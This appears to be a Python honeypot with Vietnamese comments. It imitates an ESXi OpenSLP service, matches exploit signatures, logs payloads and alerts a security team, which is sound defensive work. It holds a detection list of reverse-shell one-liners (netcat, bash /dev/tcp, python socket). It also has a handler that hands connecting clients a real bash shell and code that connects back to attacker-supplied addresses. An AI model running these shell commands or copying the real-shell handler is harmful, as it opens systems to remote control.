import logging
import os
import pty
import socket
import subprocess
import threading
import random
import time
import re
import sys
from ssh2 import handle_esxi_honeypot, fs_honeypot
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), 'Shell_Commands')))  # Thêm thư mục cha vào đường dẫn

import ESXi_fs as fs  # Bây giờ bạn sẽ có thể import ESXi_fs
from scapy.all import *
from config import OPENSLP_PORT, SERVER_IP, POC_DATABASE
from utils import send_message_to_soc, log_event
from ssh2 import handle_esxi_honeypot, fs_honeypot

REVERSE_SHELL_REGEXES = [
    r"nc -e /bin/sh (.*?) (\d+)",
    r"bash -i >& /dev/tcp/(.*?)/(\d+) 0>&1",
    r"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"(.*?)\",)?(\d+));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
    # regex reverse shell
]    


# --- OpenSLP Deception ---

# Danh sách các service giả mạo
FAKE_SERVICES = [
    {
        "service_type": "service:test",
        "service_url": "http://fake-esxi.local/test",
        "attributes": "(attr1=val1),(attr2=val2)",
    },
    {
        "service_type": "service:example",
        "service_url": "https://fake-esxi.local/example",
        "attributes": "(attr3=val3)",
    },
    # Thêm các service giả mạo khác
]

# --- ESXi Shell Mocking ---
def extract_ip_port(request_str):
    """Trích xuất địa chỉ IP và cổng từ payload reverse shell."""
    for regex in REVERSE_SHELL_REGEXES:
        match = re.search(regex, request_str)
        if match:
            try:
                attacker_ip = match.group(1)
                attacker_port = int(match.group(2))
                return attacker_ip, attacker_port
            except:
                return None, None
    return None, None

def handle_esxi_shell(client_socket, address):
    """Mô phỏng shell của ESXi."""
    log_event(f"[ESXi Shell] Kết nối từ {address}")

    # Tạo pseudo-terminal và thực thi shell của honeypot
    master, slave = pty.openpty()
    shell_command = ["/bin/bash"]  # Thay đổi command nếu cần

    shell_process = subprocess.Popen(shell_command, stdin=slave, stdout=slave, stderr=slave)

    # Chuyển hướng input/output giữa socket và pseudo-terminal
    while True:
        try:
            # Đọc dữ liệu từ socket (attacker)
            data = client_socket.recv(1024)
            if not data:
                break
            # Ghi dữ liệu vào pseudo-terminal (honeypot shell)
            os.write(master, data)

            # Đọc output từ pseudo-terminal
            output = os.read(master, 1024)
            # Gửi output đến socket (attacker)
            client_socket.send(output)
        except Exception as e:
            log_event(f"[ESXi Shell] Error: {e}", level=logging.ERROR)
            break

    shell_process.terminate()
    client_socket.close()
    
def handle_fake_shell(client_socket, address):
    """Xử lý shell giả lập."""
    log_event(f"[Fake Shell] Kết nối từ {address}")

    client_ip = address[0]
    fs_instance = fs.SimpleFS(root="")  # Tạo instance filesystem giả lập

    # Mô phỏng shell
    try:
        channel = client_socket  # Sử dụng socket trực tiếp làm channel
        channel.send(b"Welcome to the fake shell!\r\n")
        channel.send(b"[root@fake-esxi:~] # ")  # Prompt giả mạo

        while True:
            try:
                command = channel.recv(1024).decode().strip()
                if not command:
                    break
                if command.lower() == 'exit':
                    channel.send(b"Goodbye!\r\n")
                    break

                log_event(f"[Fake Shell] {address} - Command: {command}")
                send_message_to_soc(f"[Fake Shell] {address} - Command: {command}")

                # Sử dụng command_handler để xử lý lệnh
                response = handle_command(command, "SSH", address)  # Giả sử sử dụng command_handler của SSH

                # Mô phỏng độ trễ ngẫu nhiên
                time.sleep(random.uniform(0.1, 0.5))

                channel.send(response.encode() + b"\r\n")
                channel.send(b"[root@fake-esxi:~] # ") 
            except Exception as e:
                logging.exception(f"[Fake Shell] Error during command processing:")
                break
    except Exception as e:
        logging.exception(f"[Fake Shell] Error handling connection from {address}:")
    finally:
        client_socket.close()

# def handle_openslp_request_udp(data, address):
#     """Xử lý yêu cầu OpenSLP giả mạo (UDP)."""
#     try:
#         # Thêm try-except để xử lý lỗi giải mã
#         try:
#             request_str = data.decode('utf-8')
#         except UnicodeDecodeError:
#             try:
#                 request_str = data.decode('latin-1')  # Thử mã hóa Latin-1
#             except UnicodeDecodeError:
#                 try:
#                     request_str = data.decode('ascii')  # Thử mã hóa ASCII
#                 except UnicodeDecodeError:
#                     log_event(f"[OpenSLP] Error decoding request: Unable to decode data.", level=logging.ERROR)
#                     return

#         log_event(f"[OpenSLP] Request from {address}: {request_str}")  # Ghi log request
#         send_message_to_soc(f"[OpenSLP] Request from {address}: {request_str}")

#         # Kiểm tra PoC
#         for poc_name, poc_info in POC_DATABASE.items():
#             if "signature" in poc_info and poc_info["signature"] in request_str:
#                 log_event(f"[OpenSLP] Detected PoC: {poc_name} from {address}")
#                 send_message_to_soc(f"[OpenSLP] Detected PoC: {poc_name} from {address}")
#             elif "service_type" in poc_info and poc_info["service_type"] in request_str:
#                 log_event(f"[OpenSLP] Detected PoC: {poc_name} from {address}")
#                 send_message_to_soc(f"[OpenSLP] Detected PoC: {poc_name} from {address}")

#         # Phân tích yêu cầu và trích xuất thông tin
#         request_parts = request_str.split(" ")
#         request_type = request_parts[0]

#         # Kiểm tra xem payload có lớn hơn 10 byte hay không
#         log_event(f"[OpenSLP] checking size of payload: {len(data)} > 10")
#         if len(data) > 10:
#             log_event(f"[OpenSLP] Detected potential ESXi exploit attempt.")

#             # Tạo socket và lắng nghe kết nối từ payload
#             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
#                 sock.bind(('', random.randint(1025, 65535)))  # Chọn cổng ngẫu nhiên
#                 sock.listen(1)
#                 client_socket, _ = sock.accept()

#                 # Khởi động thread xử lý shell của ESXi giả mạo
#                 threading.Thread(target=handle_esxi_shell, args=(client_socket, address)).start()
#             return

#         # Xử lý các request OpenSLP thông thường
#         if request_type == "SrvRqst":
#             # Yêu cầu tìm kiếm dịch vụ
#             service = random.choice(FAKE_SERVICES)
#             fake_response = f"SrvRply {service['service_type']} {service['service_url']} {service['attributes']}\r\n".encode()
#         elif request_type == "AttrRqst":
#             # Yêu cầu lấy thuộc tính của service
#             fake_response = b"AttrRply (attr1=fake),(attr2=value)\r\n"
#         else:
#             fake_response = b"OpenSLP-Error: Unsupported request type\r\n"

#         with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
#             sock.sendto(fake_response, address)

#     except UnicodeDecodeError as e:
#         log_event(f"[OpenSLP] Error decoding request from {address}: {e}", level=logging.ERROR)
#     except Exception as e:
#         log_event(f"[OpenSLP] Error handling request: {e}", level=logging.ERROR)

def handle_openslp_exploit(client_socket, address):
    """Mô phỏng khai thác lỗ hổng OpenSLP và tạo shell."""
    client_ip = address[0]
    print(f"[OpenSLP Exploit] Kết nối từ {address}")
    log_event(f"[OpenSLP Exploit] Kết nối từ {address}")

    # Mô phỏng thời gian khai thác lỗ hổng
    delay = random.uniform(2, 5) 
    for i in range(int(delay)):
        print(f"[OpenSLP Exploit] Exploiting... {int(delay - i)}s remaining", end='\r')
        time.sleep(1)
    print(" " * 50, end='\r') # Xóa dòng trước 

    try:
        # Mô phỏng thành công khai thác
        print(f"[OpenSLP Exploit] Exploit successful! Spawning shell for {address}...")
        log_event(f"[OpenSLP Exploit] Exploit successful! Spawning shell for {address}...")

        # Tạo shell giả lập
        #handle_esxi_honeypot(client_socket, client_ip, fs_honeypot)

    except Exception as e:
        log_event(f"[OpenSLP Exploit] Error: {e}", level=logging.ERROR)
        client_socket.close()
MARKER = b"\xef\xbe\xad\xde"
def handle_openslp_request(client_socket, address):
    """Xử lý yêu cầu OpenSLP giả mạo (TCP)."""

    try:
        data = client_socket.recv(1024)
        log_event(f"[OpenSLP] checking file of payload: {len(data)} > 10")

        # Kiểm tra PoC dựa trên signature
        request_str = data.decode('utf-8', errors='ignore')
        for poc_name, poc_info in POC_DATABASE.items():
            if "signature" in poc_info and re.search(poc_info["signature"], request_str):
                log_event(f"[OpenSLP] Detected PoC: {poc_name} from {address} with signature: {poc_info['signature']}")
                send_message_to_soc(f"[OpenSLP] Detected PoC: {poc_name} from {address} with signature: {poc_info['signature']}")
                # Ghi log vào honeypot.log
                with open("honeypot.log", "a") as f:
                    f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] - {address}: Detected PoC: {poc_name}\n")
                with open("honeypot.log", "a") as f:
                    f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] - {address}: Payload: {data.hex()}\n")
                # Bắt đầu thread xử lý shell của ESXi giả mạo
                #threading.Thread(target=handle_esxi_shell, args=(client_socket, address)).start()
                return
        
        # Phân tích yêu cầu và trích xuất thông tin
        request_parts = request_str.split(" ")
        request_type = request_parts[0]
        print ("request_type:",request_type)
        attacker_ip, attacker_port = extract_ip_port(request_str)
        print("attack ip: ",attacker_ip)
        
        
        # Xử lý các request OpenSLP thông thường
        if request_type == "SrvRqst":
            # Yêu cầu tìm kiếm dịch vụ
            service = random.choice(FAKE_SERVICES)
            fake_response = f"SrvRply {service['service_type']} {service['service_url']} {service['attributes']}\r\n".encode()
        elif request_type == "AttrRqst":
            # Yêu cầu lấy thuộc tính của service
            fake_response = b"AttrRply (attr1=fake),(attr2=value)\r\n"
        else:
            if len(data) > 10:
                client_socket.send(MARKER)
                log_event(f"[OpenSLP] Sent marker to {address} (payload size: {len(data)})")
                log_event(f"[OpenSLP] Detected potential ESXi exploit attempt.")
                # Ghi payload vào file honeypot.log
                with open("honeypot.log", "a") as f:
                    f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] - {address}: Payload: {data.hex()}\n")

                # Chuyển sang xử lý mô phỏng khai thác lỗ hổng
                if attacker_ip and attacker_port:
                    log_event(f"[OpenSLP] Detected reverse shell attempt to {attacker_ip}:{attacker_port}")
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                        sock.connect((attacker_ip, attacker_port))
                        client_ip = address[0]
                        fs_instance = fs.SimpleFS(root="/home/iaw301/")
                        threading.Thread(target=handle_fake_shell, args=(sock, address)).start() # Sử dụng sock mới
                        return
                handle_openslp_exploit(client_socket, address)
                return    
            else:
            	fake_response = b"OpenSLP-Error: Unsupported request type\r\n"

        client_socket.send(fake_response)

        # Thêm try-except để xử lý lỗi giải mã
        try:
            request_str = data.decode('utf-8')
        except UnicodeDecodeError:
            try:
                request_str = data.decode('latin-1')  # Thử mã hóa Latin-1
            except UnicodeDecodeError:
                try:
                    request_str = data.decode('ascii')  # Thử mã hóa ASCII
                except UnicodeDecodeError:
                    log_event(f"[OpenSLP] Error decoding request: Unable to decode data.", level=logging.ERROR)
                    return

        # if len(data) > 10:
        #     client_socket.send(MARKER)
        #     log_event(f"[OpenSLP] Sent marker to {address} (payload size: {len(data)})")
        #     log_event(f"[OpenSLP] Detected potential ESXi exploit attempt.")
        #     # Ghi payload vào file honeypot.log
        #     with open("honeypot.log", "a") as f:
        #         f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] - {address}: Payload: {data.hex()}\n")

        #     # Chuyển sang xử lý mô phỏng khai thác lỗ hổng
        #     handle_openslp_exploit(client_socket, address)
        #     return      

        log_event(f"[OpenSLP] Request from {address}: {request_str}")  # Ghi log request
        send_message_to_soc(f"[OpenSLP] Request from {address}: {request_str}")
        

        # Kiểm tra PoC
        for poc_name, poc_info in POC_DATABASE.items():
            if "signature" in poc_info and poc_info["signature"] in request_str:
                log_event(f"[OpenSLP] Detected PoC: {poc_name} from {address}")
                send_message_to_soc(f"[OpenSLP] Detected PoC: {poc_name} from {address}")
            elif "service_type" in poc_info and poc_info["service_type"] in request_str:
                log_event(f"[OpenSLP] Detected PoC: {poc_name} from {address}")
                send_message_to_soc(f"[OpenSLP] Detected PoC: {poc_name} from {address}")

        # Kiểm tra xem payload có lớn hơn 10 byte hay không

    except UnicodeDecodeError as e:
        log_event(f"[OpenSLP] Error decoding request from {address}: {e}", level=logging.ERROR)
    except Exception as e:
        log_event(f"[OpenSLP] Error handling request: {e}", level=logging.ERROR)


def run_openslp_server():
    """Khởi động OpenSLP server giả mạo."""
    # Khởi tạo server TCP
    sock_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock_tcp.bind((SERVER_IP, OPENSLP_PORT))
    sock_tcp.listen(1)
    print(f"[OpenSLP] OpenSLP giả mạo đang lắng nghe trên cổng {OPENSLP_PORT} (TCP)")
    log_event(f"[OpenSLP] OpenSLP server started on port {OPENSLP_PORT} (TCP)")

    while True:
        try:
            client_socket, client_address = sock_tcp.accept()
            log_event(f"[INFO] Accepted connection from {client_address}")
            client_handler = threading.Thread(target=handle_openslp_request, args=(client_socket, client_address))
            client_handler.start()
        except Exception as e:
            log_event(f"[SSH] Error accepting connection: {e}", level=logging.ERROR)


if __name__ == "__main__":
    run_openslp_server()
